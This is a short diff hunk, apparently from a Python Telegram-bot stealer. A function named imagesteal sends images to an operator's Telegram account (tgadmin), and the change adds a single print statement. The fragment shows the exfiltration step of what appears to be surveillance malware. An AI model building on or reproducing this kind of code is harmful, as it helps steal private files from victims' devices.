@@ -104,6 +104,7 @@ def imagesteal(message):
 			linku = file_as_link(path)
 			time.sleep(10)
 			if img is not None:
+				print(img)
 				bot.send_photo(tgadmin,img)
 			a-=1
 				   
